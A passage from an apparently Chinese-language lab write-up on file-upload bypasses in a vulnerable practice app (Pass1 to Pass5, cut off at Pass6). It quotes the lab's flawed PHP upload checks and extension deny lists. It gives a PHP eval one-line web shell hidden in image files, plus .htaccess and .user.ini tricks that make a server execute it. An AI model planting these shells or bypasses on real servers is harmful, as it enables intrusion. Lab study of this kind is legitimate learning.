class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前端的都好办：</p>
<ol>
<li><p>直接禁用JS</p>
</li>
<li><p>F12改前端代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allow_ext = &quot;.jpg|.png|.gif|.php&quot;;</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>注：这里无法用bp修改，因为前端先检测，所以数据都无法发送至bp</p>
</blockquote>
<h2 id="Pass2【MIME验证】"><a href="#Pass2【MIME验证】" class="headerlink" title="Pass2【MIME验证】"></a>Pass2【MIME验证】</h2><p>这一关是一个后端的content-type验证：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2-2.png" alt="2-2"></p>
<p>只要bp抓个包，然后修改以下content-type即可</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2-1.png" alt="2-1"></p>
<h2 id="Pass3【后端黑名单验后缀】"><a href="#Pass3【后端黑名单验后缀】" class="headerlink" title="Pass3【后端黑名单验后缀】"></a>Pass3【后端黑名单验后缀】</h2><p>这一关是后端黑名单验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以用.phtml&#x2F;.php3&#x2F;.php5代替</p>
<h2 id="Pass4【-htaccess】"><a href="#Pass4【-htaccess】" class="headerlink" title="Pass4【.htaccess】"></a>Pass4【.htaccess】</h2><p>这一关在Pass3的基础上，禁用了一切可以直接代替的后缀名，可是没有禁.htaccess</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>htaccess文件介绍：</p>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、<strong>改变文件扩展名</strong>、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<p>.htaccess文件的内容有几种：</p>
<p><strong>法一</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FileMatch 参数即为文件名的正则匹配</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;base&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// base.png</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ag&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>法二</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ag&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>法三</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 自解析的 .htaccess</span><br><span class="line"><span class="tag">&lt;<span class="name">Files</span> &quot;\<span class="attr">.htaccess</span>&quot;&gt;</span></span><br><span class="line">    Allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;\<span class="attr">.htaccess</span>&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"># <span class="meta">&lt;?php eval($_POST[&#x27;a1batr0ss&#x27;]);?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># 不过这种方式测试并没有成功... 暂时不清楚原因</span><br></pre></td></tr></table></figure>



<h3 id="小发现1"><a href="#小发现1" class="headerlink" title="小发现1"></a>小发现1</h3><blockquote>
<p>这个法三虽然无法成功，但是我发现，如果法三的这个.htaccess和正常的base.php同时在upload文件夹下，base.php也无法连接蚁剑！！！</p>
</blockquote>
<p>Pass4步骤：</p>
<ol>
<li>上传base.png</li>
<li>上传.htacess</li>
<li>蚁剑连接base.png【不是base.php】</li>
</ol>
<h2 id="Pass5【-user-ini】"><a href="#Pass5【-user-ini】" class="headerlink" title="Pass5【.user.ini】"></a>Pass5【.user.ini】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>听说这是新增的一关，之所以新增这一关我觉得就是为了加上.user.ini这一绕过方法【因为upload文件夹里多了readme.php，可以成为.user.ini的跳板，之前没有时无法这样绕过】</p>
<blockquote>
<h2 id="那么什么是-user-ini？"><a href="#那么什么是-user-ini？" class="headerlink" title="那么什么是.user.ini？"></a>那么什么是.user.ini？</h2><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png" alt="enter image description here"></p>
<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a target="_blank" rel="noopener" href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272554789.png" alt="enter image description here"></p>
<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272569525.png" alt="enter image description here"></p>
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
</blockquote>
<p>那么使用方法就很明显了:</p>
<ol>
<li><p>我们先上传一个base.png，里面写着一句话木马</p>
</li>
<li><p>然后再上传.user.ini，里面写:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=base.png</span><br></pre></td></tr></table></figure>

<p>这样在所有以该网页目录下及其子目录里的网页，都会包含base.png的内容（也就是一句话木马）。</p>
</li>
<li><p>蚁剑连接readme.php【同目录或子目录下任意php】</p>
</li>
</ol>
<h2 id="Pass6【大小写绕过】-1"><a href="#Pass6【大小写绕过】-1" class="headerlink" title="Pass6【大小写绕过】"></a>Pass6【大小写绕过】</h2><p>这关就是在Pass4的基础上又禁用了<code>.htaccess</code>，可是没有限制大小写。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) 